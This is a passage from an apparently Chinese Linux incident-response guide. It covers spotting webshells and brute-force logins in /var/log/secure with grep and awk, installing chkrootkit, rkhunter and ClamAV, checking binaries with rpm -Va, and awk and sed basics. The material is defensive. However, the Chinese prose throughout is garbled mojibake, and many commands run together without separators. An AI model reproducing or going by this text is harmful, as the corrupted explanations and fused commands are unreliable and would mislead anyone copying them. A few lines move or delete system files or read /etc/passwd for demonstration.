8ã€æ£€æŸ¥å¼‚å¸¸æ–‡ä»¶ æŸ¥çœ‹æ•æ„Ÿç›®å½•ï¼Œå¦‚/tmpç›®å½•ä¸‹çš„æ–‡ä»¶ï¼ŒåŒæ—¶æ³¨æ„éšè—æ–‡ä»¶å¤¹ï¼Œä»¥â€œ..â€ä¸ºåçš„æ–‡ä»¶å¤¹å…·æœ‰éšè—å±æ€§ å¾—åˆ°å‘ç°WEBSHELLã€è¿œæ§æœ¨é©¬çš„åˆ›å»ºæ—¶é—´ï¼Œå¦‚ä½•æ‰¾å‡ºåŒä¸€æ—¶é—´èŒƒå›´å†…åˆ›å»ºçš„æ–‡ä»¶ï¼Ÿ&emsp;&emsp;å¯ä»¥ä½¿ç”¨findå‘½ä»¤æ¥æŸ¥æ‰¾ï¼Œå¦‚ find /opt -iname &quot;*&quot; -atime 1 -type f æ‰¾å‡º /opt ä¸‹ä¸€å¤©å‰è®¿é—®è¿‡çš„æ–‡ä»¶ é’ˆå¯¹å¯ç–‘æ–‡ä»¶å¯ä»¥ä½¿ç”¨ stat è¿›è¡Œåˆ›å»ºä¿®æ”¹æ—¶é—´ã€‚ 9ã€æ£€æŸ¥ç³»ç»Ÿæ—¥å¿—æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/ æŸ¥çœ‹æ—¥å¿—é…ç½®æƒ…å†µï¼šmore /etc/rsyslog.conf æ—¥å¿—æ–‡ä»¶ è¯´æ˜ /var/log/cron è®°å½•äº†ç³»ç»Ÿå®šæ—¶ä»»åŠ¡ç›¸å…³çš„æ—¥å¿— /var/log/cups è®°å½•æ‰“å°ä¿¡æ¯çš„æ—¥å¿— /var/log/dmesg è®°å½•äº†ç³»ç»Ÿåœ¨å¼€æœºæ—¶å†…æ ¸è‡ªæ£€çš„ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨dmesgå‘½ä»¤ç›´æ¥æŸ¥çœ‹å†…æ ¸è‡ªæ£€ä¿¡æ¯ /var/log/mailog è®°å½•é‚®ä»¶ä¿¡æ¯ /var/log/message è®°å½•ç³»ç»Ÿé‡è¦ä¿¡æ¯çš„æ—¥å¿—ã€‚è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­ä¼šè®°å½•Linuxç³»ç»Ÿçš„ç»å¤§å¤šæ•°é‡è¦ä¿¡æ¯ï¼Œå¦‚æœç³»ç»Ÿå‡ºç°é—®é¢˜æ—¶ï¼Œé¦–å…ˆè¦æ£€æŸ¥çš„å°±åº”è¯¥æ˜¯è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ /var/log/btmp è®°å½•é”™è¯¯ç™»å½•æ—¥å¿—ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viæŸ¥çœ‹ï¼Œè€Œè¦ä½¿ç”¨lastbå‘½ä»¤æŸ¥çœ‹ /var/log/lastlog è®°å½•ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´çš„æ—¥å¿—ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viï¼Œè€Œè¦ä½¿ç”¨lastlogå‘½ä»¤æŸ¥çœ‹ /var/log/wtmp æ°¸ä¹…è®°å½•æ‰€æœ‰ç”¨æˆ·çš„ç™»å½•ã€æ³¨é”€ä¿¡æ¯ï¼ŒåŒæ—¶è®°å½•ç³»ç»Ÿçš„å¯åŠ¨ã€é‡å¯ã€å…³æœºäº‹ä»¶ã€‚åŒæ ·è¿™ä¸ªæ–‡ä»¶ä¹Ÿæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viï¼Œè€Œéœ€è¦ä½¿ç”¨lastå‘½ä»¤æ¥æŸ¥çœ‹ /var/log/utmp è®°å½•å½“å‰å·²ç»ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šéšç€ç”¨æˆ·çš„ç™»å½•å’Œæ³¨é”€ä¸æ–­å˜åŒ–ï¼Œåªè®°å½•å½“å‰ç™»å½•ç”¨æˆ·çš„ä¿¡æ¯ã€‚åŒæ ·è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ç›´æ¥viï¼Œè€Œè¦ä½¿ç”¨w,who,usersç­‰å‘½ä»¤æ¥æŸ¥è¯¢ /var/log/secure è®°å½•éªŒè¯å’Œæˆæƒæ–¹é¢çš„ä¿¡æ¯ï¼Œåªè¦æ¶‰åŠè´¦å·å’Œå¯†ç çš„ç¨‹åºéƒ½ä¼šè®°å½•ï¼Œæ¯”å¦‚SSHç™»å½•ï¼Œsuåˆ‡æ¢ç”¨æˆ·ï¼Œsudoæˆæƒï¼Œç”šè‡³æ·»åŠ ç”¨æˆ·å’Œä¿®æ”¹ç”¨æˆ·å¯†ç éƒ½ä¼šè®°å½•åœ¨è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­ æ—¥å¿—åˆ†ææŠ€å·§ï¼š 1ã€å®šä½æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºçš„rootå¸å·ï¼š grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | moreå®šä½æœ‰å“ªäº›IPåœ¨çˆ†ç ´ï¼šgrep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -cçˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿgrep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\\n&quot;;&#125;&#x27;|uniq -c|sort -nr 2ã€ç™»å½•æˆåŠŸçš„IPæœ‰å“ªäº›ï¼š grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | moreç™»å½•æˆåŠŸçš„æ—¥æœŸã€ç”¨æˆ·åã€IPï¼šgrep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; 3ã€å¢åŠ ä¸€ä¸ªç”¨æˆ·kaliæ—¥å¿—ï¼šJul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali, shell=/bin/bashJul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali#grep &quot;useradd&quot; /var/log/secure 4ã€åˆ é™¤ç”¨æˆ·kaliæ—¥å¿—ï¼šJul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;# grep &quot;userdel&quot; /var/log/secure5ã€suåˆ‡æ¢ç”¨æˆ·ï¼šJul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)sudoæˆæƒæ‰§è¡Œ:sudo -lJul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now ä¸‰ã€å·¥å…·ç¯‡1ã€RootkitæŸ¥æ€ chkrootkitï¼šhttp://www.chkrootkit.org ä½¿ç”¨æ–¹æ³•ï¼šwget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gztar zxvf chkrootkit.tar.gzcd chkrootkit-0.52make sense#ç¼–è¯‘å®Œæˆæ²¡æœ‰æŠ¥é”™çš„è¯æ‰§è¡Œæ£€æŸ¥./chkrootkit rkhunterï¼šhttp://rkhunter.sourceforge.net ä½¿ç”¨æ–¹æ³•ï¼šWget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gztar -zxvf rkhunter-1.4.4.tar.gzcd rkhunter-1.4.4./installer.sh --installrkhunter -c 2ã€ç—…æ¯’æŸ¥æ€ Clamavï¼šhttp://www.clamav.net/download.htmlå®‰è£…æ–¹å¼ä¸€ï¼š 1ã€å®‰è£… zlibï¼šwget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz tar -zxvf zlib-1.2.7.tar.gzcd zlib-1.2.7#å®‰è£…ä¸€ä¸‹gccç¼–è¯‘ç¯å¢ƒï¼š yum install gccCFLAGS=&quot;-O3 -fPIC&quot; ./configure --prefix= /usr/local/zlib/make &amp;&amp; make install2ã€æ·»åŠ ç”¨æˆ·ç»„ clamav å’Œç»„æˆå‘˜ clamavï¼šgroupadd clamavuseradd -g clamav -s /bin/false -c &quot;Clam AntiVirus&quot; clamav3ã€å®‰è£… Clamavtar â€“zxvf clamav-0.97.6.tar.gzcd clamav-0.97.6./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlibmakemake install4ã€é…ç½® Clamavmkdir /opt/clamav/logsmkdir /opt/clamav/updatatouch /opt/clamav/logs/freshclam.logtouch /opt/clamav/logs/clamd.logcd /opt/clamav/logschown clamav:clamav clamd.logchown clamav:clamav freshclam.log5ã€ClamAV ä½¿ç”¨ï¼š /opt/clamav/bin/freshclam å‡çº§ç—…æ¯’åº“./clamscan â€“h æŸ¥çœ‹ç›¸åº”çš„å¸®åŠ©ä¿¡æ¯./clamscan -r /home æ‰«ææ‰€æœ‰ç”¨æˆ·çš„ä¸»ç›®å½•å°±ä½¿ç”¨./clamscan -r --bell -i /bin æ‰«æbinç›®å½•å¹¶ä¸”æ˜¾ç¤ºæœ‰é—®é¢˜çš„æ–‡ä»¶çš„æ‰«æç»“æœ å®‰è£…æ–¹å¼äºŒï¼š #å®‰è£…yum install -y clamav#æ›´æ–°ç—…æ¯’åº“freshclam#æ‰«ææ–¹æ³•clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.logclamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.logclamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log#æ‰«æå¹¶æ€æ¯’clamscan -r --remove /usr/bin/bsd-portclamscan -r --remove /usr/bin/clamscan -r --remove /usr/local/zabbix/sbin#æŸ¥çœ‹æ—¥å¿—å‘ç°cat /root/usrclamav.log |grep FOUND 3ã€webshellæŸ¥æ€Linux ç‰ˆï¼š æ²³é©¬ WebShell æŸ¥æ€ï¼šhttp://www.shellpub.com 4ã€RPM check æ£€æŸ¥ç³»ç»Ÿå®Œæ•´æ€§å¯ä»¥é€šè¿‡rpmè‡ªå¸¦çš„-Vaæ¥æ ¡éªŒæ£€æŸ¥æ‰€æœ‰çš„rpmè½¯ä»¶åŒ…ï¼ŒæŸ¥çœ‹å“ªäº›å‘½ä»¤æ˜¯å¦è¢«æ›¿æ¢äº†ï¼š ./rpm -Va &gt; rpm.log å¦‚æœä¸€åˆ‡å‡æ ¡éªŒæ­£å¸¸å°†ä¸ä¼šäº§ç”Ÿä»»ä½•è¾“å‡ºï¼Œå¦‚æœæœ‰ä¸ä¸€è‡´çš„åœ°æ–¹ï¼Œå°±ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œè¾“å‡ºæ ¼å¼æ˜¯8ä½é•¿å­—ç¬¦ä¸²ï¼Œæ¯ä¸ªå­—ç¬¦éƒ½ç”¨ä»¥è¡¨ç¤ºæ–‡ä»¶ä¸RPMæ•°æ®åº“ä¸­ä¸€ç§å±æ€§çš„æ¯”è¾ƒç»“æœ ï¼Œå¦‚æœæ˜¯. (ç‚¹) åˆ™è¡¨ç¤ºæµ‹è¯•é€šè¿‡ã€‚ éªŒè¯å†…å®¹ä¸­çš„8ä¸ªä¿¡æ¯çš„å…·ä½“å†…å®¹å¦‚ä¸‹ï¼š S æ–‡ä»¶å¤§å°æ˜¯å¦æ”¹å˜ M æ–‡ä»¶çš„ç±»å‹æˆ–æ–‡ä»¶çš„æƒé™ï¼ˆrwxï¼‰æ˜¯å¦è¢«æ”¹å˜ 5 æ–‡ä»¶MD5æ ¡éªŒæ˜¯å¦æ”¹å˜ï¼ˆå¯ä»¥çœ‹æˆæ–‡ä»¶å†…å®¹æ˜¯å¦æ”¹å˜ï¼‰ D è®¾å¤‡ä¸­ï¼Œä»ä»£ç æ˜¯å¦æ”¹å˜ L æ–‡ä»¶è·¯å¾„æ˜¯å¦æ”¹å˜ U æ–‡ä»¶çš„å±ä¸»ï¼ˆæ‰€æœ‰è€…ï¼‰æ˜¯å¦æ”¹å˜ G æ–‡ä»¶çš„å±ç»„æ˜¯å¦æ”¹å˜ T æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´æ˜¯å¦æ”¹å˜ å¦‚æœå‘½ä»¤è¢«æ›¿æ¢äº†ï¼Œå¦‚æœè¿˜åŸå›æ¥ï¼š æ–‡ä»¶æå–è¿˜åŸæ¡ˆä¾‹ï¼šrpm -qf /bin/ls æŸ¥è¯¢ ls å‘½ä»¤å±äºå“ªä¸ªè½¯ä»¶åŒ…mv /bin/ls /tmp å…ˆæŠŠ ls è½¬ç§»åˆ° tmp ç›®å½•ä¸‹ï¼Œé€ æˆ ls å‘½ä»¤ä¸¢å¤±çš„å‡è±¡rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls æå– rpm åŒ…ä¸­ ls å‘½ä»¤åˆ°å½“å‰ç›®å½•çš„ /bin/ls ä¸‹cp /root/bin/ls /bin/ æŠŠ ls å‘½ä»¤å¤åˆ¶åˆ° /bin/ ç›®å½• ä¿®å¤æ–‡ä»¶ä¸¢å¤± 5ã€Linuxå®‰å…¨æ£€æŸ¥è„šæœ¬Github é¡¹ç›®åœ°å€ï¼š https://github.com/grayddq/GScan https://github.com/ppabc/security_check https://github.com/T0xst/linux å°½ä¿¡ä¹¦ä¸å¦‚æ— ä¹¦ï¼Œå·¥å…·åªæ˜¯è¾…åŠ©ï¼Œåˆ«å¤ªè¿‡äºä¾èµ–ï¼Œå…³é”®åœ¨äºä½ å¦‚ä½•è§£å†³é—®é¢˜çš„æ€è·¯ã€‚ å››ã€çŸ¥è¯†ç‚¹è¡¥å……1ã€awkå‘½ä»¤AWK æ˜¯ä¸€ç§å¤„ç†æ–‡æœ¬æ–‡ä»¶çš„è¯­è¨€ï¼Œæ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ–‡æœ¬åˆ†æå·¥å…·ã€‚ ã€è¯­æ³•ã€‘ awk [é€‰é¡¹å‚æ•°] &#x27;script&#x27; var=value file(s)æˆ–awk [é€‰é¡¹å‚æ•°] -f scriptfile var=value file(s) ã€é€‰é¡¹å‚æ•°è¯´æ˜ã€‘ [+] -F fs or --field-separator fsæŒ‡å®šè¾“å…¥æ–‡ä»¶æŠ˜åˆ†éš”ç¬¦ï¼Œfsæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–è€…æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¦‚-F:ã€‚[+] -v var=value or --asign var=valueèµ‹å€¼ä¸€ä¸ªç”¨æˆ·å®šä¹‰å˜é‡ã€‚[+] -f scripfile or --file scriptfileä»è„šæœ¬æ–‡ä»¶ä¸­è¯»å–awkå‘½ä»¤ã€‚[+] -mf nnn and -mr nnnå¯¹nnnå€¼è®¾ç½®å†…åœ¨é™åˆ¶ï¼Œ-mfé€‰é¡¹é™åˆ¶åˆ†é…ç»™nnnçš„æœ€å¤§å—æ•°ç›®ï¼›-mré€‰é¡¹é™åˆ¶è®°å½•çš„æœ€å¤§æ•°ç›®ã€‚è¿™ä¸¤ä¸ªåŠŸèƒ½æ˜¯Bellå®éªŒå®¤ç‰ˆawkçš„æ‰©å±•åŠŸèƒ½ï¼Œåœ¨æ ‡å‡†awkä¸­ä¸é€‚ç”¨ã€‚[+] -W compact or --compat, -W traditional or --traditionalåœ¨å…¼å®¹æ¨¡å¼ä¸‹è¿è¡Œawkã€‚æ‰€ä»¥gawkçš„è¡Œä¸ºå’Œæ ‡å‡†çš„awkå®Œå…¨ä¸€æ ·ï¼Œæ‰€æœ‰çš„awkæ‰©å±•éƒ½è¢«å¿½ç•¥ã€‚[+] -W copyleft or --copyleft, -W copyright or --copyrightæ‰“å°ç®€çŸ­çš„ç‰ˆæƒä¿¡æ¯ã€‚[+] -W help or --help, -W usage or --usageæ‰“å°å…¨éƒ¨awké€‰é¡¹å’Œæ¯ä¸ªé€‰é¡¹çš„ç®€çŸ­è¯´æ˜ã€‚[+] -W lint or --lintæ‰“å°ä¸èƒ½å‘ä¼ ç»Ÿunixå¹³å°ç§»æ¤çš„ç»“æ„çš„è­¦å‘Šã€‚[+] -W lint-old or --lint-oldæ‰“å°å…³äºä¸èƒ½å‘ä¼ ç»Ÿunixå¹³å°ç§»æ¤çš„ç»“æ„çš„è­¦å‘Šã€‚[+] -W posixæ‰“å¼€å…¼å®¹æ¨¡å¼ã€‚ä½†æœ‰ä»¥ä¸‹é™åˆ¶ï¼Œä¸è¯†åˆ«ï¼š/xã€å‡½æ•°å…³é”®å­—ã€funcã€æ¢ç åºåˆ—ä»¥åŠå½“fsæ˜¯ä¸€ä¸ªç©ºæ ¼æ—¶ï¼Œå°†æ–°è¡Œä½œä¸ºä¸€ä¸ªåŸŸåˆ†éš”ç¬¦ï¼›æ“ä½œç¬¦**å’Œ**=ä¸èƒ½ä»£æ›¿^å’Œ^=ï¼›fflushæ— æ•ˆã€‚[+] -W re-interval or --re-inervalå…è®¸é—´éš”æ­£åˆ™è¡¨è¾¾å¼çš„ä½¿ç”¨ï¼Œå‚è€ƒ(grepä¸­çš„Posixå­—ç¬¦ç±»)ï¼Œå¦‚æ‹¬å·è¡¨è¾¾å¼[[:alpha:]]ã€‚[+] -W source program-text or --source program-textä½¿ç”¨program-textä½œä¸ºæºä»£ç ï¼Œå¯ä¸-få‘½ä»¤æ··ç”¨ã€‚[+] -W version or --versionæ‰“å°bugæŠ¥å‘Šä¿¡æ¯çš„ç‰ˆæœ¬ã€‚ ã€åŸºæœ¬ç”¨æ³•ã€‘ log.txtæ–‡æœ¬å†…å®¹å¦‚ä¸‹ï¼š 2 this is a test3 Are you like awkThis&#x27;s a test10 There are orange,apple,mongo â€‹ ç”¨æ³•ä¸€ï¼š awk &#x27;&#123;[pattern] action&#125;&#x27; &#123;filenames&#125; # è¡ŒåŒ¹é…è¯­å¥ awk &#x27;&#x27; åªèƒ½ç”¨å•å¼•å· å®ä¾‹ï¼š # æ¯è¡ŒæŒ‰ç©ºæ ¼æˆ–TABåˆ†å‰²ï¼Œè¾“å‡ºæ–‡æœ¬ä¸­çš„1ã€4é¡¹ $ awk &#x27;&#123;print $1,$4&#125;&#x27; log.txt --------------------------------------------- 2 a 3 like This&#x27;s 10 orange,apple,mongo # æ ¼å¼åŒ–è¾“å‡º $ awk &#x27;&#123;printf &quot;%-8s %-10s\\n&quot;,$1,$4&#125;&#x27; log.txt --------------------------------------------- 2 a 3 like This&#x27;s 10 orange,apple,mongo ç”¨æ³•äºŒï¼š awk -F #-Fç›¸å½“äºå†…ç½®å˜é‡FS, æŒ‡å®šåˆ†å‰²å­—ç¬¦# ä½¿ç”¨&quot;,&quot;åˆ†å‰² $ awk -F, &#x27;&#123;print $1,$2&#125;&#x27; log.txt --------------------------------------------- 2 this is a test 3 Are you like awk This&#x27;s a test 10 There are orange apple # æˆ–è€…ä½¿ç”¨å†…å»ºå˜é‡ $ awk &#x27;BEGIN&#123;FS=&quot;,&quot;&#125; &#123;print $1,$2&#125;&#x27; log.txt --------------------------------------------- 2 this is a test 3 Are you like awk This&#x27;s a test 10 There are orange apple # ä½¿ç”¨å¤šä¸ªåˆ†éš”ç¬¦.å…ˆä½¿ç”¨ç©ºæ ¼åˆ†å‰²ï¼Œç„¶åå¯¹åˆ†å‰²ç»“æœå†ä½¿ç”¨&quot;,&quot;åˆ†å‰² $ awk -F &#x27;[ ,]&#x27; &#x27;&#123;print $1,$2,$5&#125;&#x27; log.txt --------------------------------------------- 2 this test 3 Are awk This&#x27;s a 10 There apple 2ã€sedå‘½ä»¤Linux sed å‘½ä»¤æ˜¯åˆ©ç”¨è„šæœ¬æ¥å¤„ç†æ–‡æœ¬æ–‡ä»¶ã€‚ sed å¯ä¾ç…§è„šæœ¬çš„æŒ‡ä»¤æ¥å¤„ç†ã€ç¼–è¾‘æ–‡æœ¬æ–‡ä»¶ã€‚ Sed ä¸»è¦ç”¨æ¥è‡ªåŠ¨ç¼–è¾‘ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶ã€ç®€åŒ–å¯¹æ–‡ä»¶çš„åå¤æ“ä½œã€ç¼–å†™è½¬æ¢ç¨‹åºç­‰ã€‚ ã€è¯­æ³•ã€‘ sed [-hnV][-e&lt;script&gt;][-f&lt;scriptæ–‡ä»¶&gt;][æ–‡æœ¬æ–‡ä»¶] ã€å‚æ•°è¯´æ˜ã€‘ [+] -e&lt;script&gt;æˆ–--expression=&lt;script&gt; ä»¥é€‰é¡¹ä¸­æŒ‡å®šçš„scriptæ¥å¤„ç†è¾“å…¥çš„æ–‡æœ¬æ–‡ä»¶ã€‚[+] -f&lt;scriptæ–‡ä»¶&gt;æˆ–--file=&lt;scriptæ–‡ä»¶&gt; ä»¥é€‰é¡¹ä¸­æŒ‡å®šçš„scriptæ–‡ä»¶æ¥å¤„ç†è¾“å…¥çš„æ–‡æœ¬æ–‡ä»¶ã€‚[+] -hæˆ–--help æ˜¾ç¤ºå¸®åŠ©ã€‚[+] -næˆ–--quietæˆ–--silent ä»…æ˜¾ç¤ºscriptå¤„ç†åçš„ç»“æœã€‚[+] -Væˆ–--version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ ã€åŠ¨ä½œè¯´æ˜ã€‘ a ï¼šæ–°å¢ï¼Œ a çš„åé¢å¯ä»¥æ¥å­—ä¸²ï¼Œè€Œè¿™äº›å­—ä¸²ä¼šåœ¨æ–°çš„ä¸€è¡Œå‡ºç°(ç›®å‰çš„ä¸‹ä¸€è¡Œ)ï½c ï¼šå–ä»£ï¼Œ c çš„åé¢å¯ä»¥æ¥å­—ä¸²ï¼Œè¿™äº›å­—ä¸²å¯ä»¥å–ä»£ n1,n2 ä¹‹é—´çš„è¡Œï¼d ï¼šåˆ é™¤ï¼Œå› ä¸ºæ˜¯åˆ é™¤å•Šï¼Œæ‰€ä»¥ d åé¢é€šå¸¸ä¸æ¥ä»»ä½•ä¸œä¸œï¼›i ï¼šæ’å…¥ï¼Œ i çš„åé¢å¯ä»¥æ¥å­—ä¸²ï¼Œè€Œè¿™äº›å­—ä¸²ä¼šåœ¨æ–°çš„ä¸€è¡Œå‡ºç°(ç›®å‰çš„ä¸Šä¸€è¡Œ)ï¼›p ï¼šæ‰“å°ï¼Œäº¦å³å°†æŸä¸ªé€‰æ‹©çš„æ•°æ®å°å‡ºã€‚é€šå¸¸ p ä¼šä¸å‚æ•° sed -n ä¸€èµ·è¿è¡Œï½s ï¼šå–ä»£ï¼Œå¯ä»¥ç›´æ¥è¿›è¡Œå–ä»£çš„å·¥ä½œå“©ï¼é€šå¸¸è¿™ä¸ª s çš„åŠ¨ä½œå¯ä»¥æ­é…æ­£è§„è¡¨ç¤ºæ³•ï¼ä¾‹å¦‚ 1,20s/old/new/g å°±æ˜¯å•¦ï¼ ã€å®ä¾‹ã€‘ åœ¨testfileæ–‡ä»¶çš„ç¬¬å››è¡Œåæ·»åŠ ä¸€è¡Œï¼Œå¹¶å°†ç»“æœè¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºï¼Œåœ¨å‘½ä»¤è¡Œæç¤ºç¬¦ä¸‹è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š sed -e 4a\\newLine testfile é¦–å…ˆæŸ¥çœ‹testfileä¸­çš„å†…å®¹å¦‚ä¸‹ï¼š $ cat testfile #æŸ¥çœ‹testfile ä¸­çš„å†…å®¹ HELLO LINUX! Linux is a free unix-type opterating system. This is a linux testfile! Linux test ä½¿ç”¨sedå‘½ä»¤åï¼Œè¾“å‡ºç»“æœå¦‚ä¸‹ï¼š $ sed -e 4a\\newline testfile #ä½¿ç”¨sed åœ¨ç¬¬å››è¡Œåæ·»åŠ æ–°å­—ç¬¦ä¸² HELLO LINUX! #testfileæ–‡ä»¶åŸæœ‰çš„å†…å®¹ Linux is a free unix-type opterating system. This is a linux testfile! Linux test newline ã€ä»¥è¡Œä¸ºå•ä½çš„æ–°å¢/åˆ é™¤ã€‘ å°† /etc/passwd çš„å†…å®¹åˆ—å‡ºå¹¶ä¸”åˆ—å°è¡Œå·ï¼ŒåŒæ—¶ï¼Œè¯·å°†ç¬¬ 2~5 è¡Œåˆ é™¤ï¼ [root@www ~]# nl /etc/passwd | sed &#x27;2,5d&#x27;1 root:x:0:0:root:/root:/bin/bash6 sync:x:5:0:sync:/sbin:/bin/sync7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown.....(åé¢çœç•¥)..... sed çš„åŠ¨ä½œä¸º â€˜2,5dâ€™ ï¼Œé‚£ä¸ª d å°±æ˜¯åˆ é™¤ï¼å› ä¸º 2-5 è¡Œç»™ä»–åˆ é™¤äº†ï¼Œæ‰€ä»¥æ˜¾ç¤ºçš„æ•°æ®å°±æ²¡æœ‰ 2-5 è¡Œç½—ï½ å¦å¤–ï¼Œæ³¨æ„ä¸€ä¸‹ï¼ŒåŸæœ¬åº”è¯¥æ˜¯è¦ä¸‹è¾¾ sed -e æ‰å¯¹ï¼Œæ²¡æœ‰ -e ä¹Ÿè¡Œå•¦ï¼åŒæ—¶ä¹Ÿè¦æ³¨æ„çš„æ˜¯ï¼Œ sed åé¢æ¥çš„åŠ¨ä½œï¼Œè¯·åŠ¡å¿…ä»¥ â€˜â€™ ä¸¤ä¸ªå•å¼•å·æ‹¬ä½å–”ï¼ åªè¦åˆ é™¤ç¬¬ 2 è¡Œ nl /etc/passwd | sed &#x27;2d&#x27; è¦åˆ é™¤ç¬¬ 3 åˆ°æœ€åä¸€è¡Œ nl /etc/passwd | sed &#x27;3,$d&#x27; åœ¨ç¬¬äºŒè¡Œå(äº¦å³æ˜¯åŠ åœ¨ç¬¬ä¸‰è¡Œ)åŠ ä¸Šã€drink tea?ã€å­—æ ·ï¼ nl /etc/passwd | sed &#x27;2i drink tea&#x27; å¦‚æœæ˜¯è¦å¢åŠ ä¸¤è¡Œä»¥ä¸Šï¼Œåœ¨ç¬¬äºŒè¡Œåé¢åŠ å…¥ä¸¤è¡Œå­—ï¼Œä¾‹å¦‚ **Drink tea or .....** ä¸ **drink beer?** [root@www ~]# nl /etc/passwd | sed &#x27;2a Drink tea or ......\\&gt; drink beer ?&#x27;1 root:x:0:0:root:/root:/bin/bash2 bin:x:1:1:bin:/bin:/sbin/nologinDrink tea or ......drink beer ?3 daemon:x:2:2:daemon:/sbin:/sbin/nologin.....(åé¢çœç•¥)..... æ¯ä¸€è¡Œä¹‹é—´éƒ½å¿…é¡»è¦ä»¥åæ–œæ ã€ \\ ã€æ¥è¿›è¡Œæ–°è¡Œçš„æ·»åŠ å–”ï¼æ‰€ä»¥ï¼Œä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°åœ¨ç¬¬ä¸€è¡Œçš„æœ€åé¢å°±æœ‰ \\ å­˜åœ¨ã€‚ ã€ä»¥è¡Œä¸ºå•ä½çš„æ›¿æ¢ä¸æ˜¾ç¤ºã€‘ å°†ç¬¬2-5è¡Œçš„å†…å®¹å–ä»£æˆä¸ºã€No 2-5 numberã€å‘¢ï¼Ÿ [root@www ~]# nl /etc/passwd | sed &#x27;2,5c No 2-5 number&#x27;1 root:x:0:0:root:/root:/bin/bashNo 2-5 number6 sync:x:5:0:sync:/sbin:/bin/sync.....(åé¢çœç•¥)..... é€è¿‡è¿™ä¸ªæ–¹æ³•æˆ‘ä»¬å°±èƒ½å¤Ÿå°†æ•°æ®æ•´è¡Œå–ä»£äº†ï¼ ä»…åˆ—å‡º /etc/passwd æ–‡ä»¶å†…çš„ç¬¬ 5-7 è¡Œ [root@www ~]# nl /etc/passwd | sed -n &#x27;5,7p&#x27;5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin6 sync:x:5:0:sync:/sbin:/bin/sync7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown å¯ä»¥é€è¿‡è¿™ä¸ª sed çš„ä»¥è¡Œä¸ºå•ä½çš„æ˜¾ç¤ºåŠŸèƒ½ï¼Œ å°±èƒ½å¤Ÿå°†æŸä¸€ä¸ªæ–‡ä»¶å†…çš„æŸäº›è¡Œå·é€‰æ‹©å‡ºæ¥æ˜¾ç¤ºã€‚ ã€æ•°æ®çš„æœå¯»å¹¶æ˜¾ç¤ºã€‘ æœç´¢ /etc/passwdæœ‰rootå…³é”®å­—çš„è¡Œ nl /etc/passwd | sed &#x27;/root/p&#x27;1 root:x:0:0:root:/root:/bin/bash1 root:x:0:0:root:/root:/bin/bash2 daemon:x:1:1:daemon:/usr/sbin:/bin/sh3 bin:x:2:2:bin:/bin:/bin/sh4 sys:x:3:3:sys:/dev:/bin/sh5 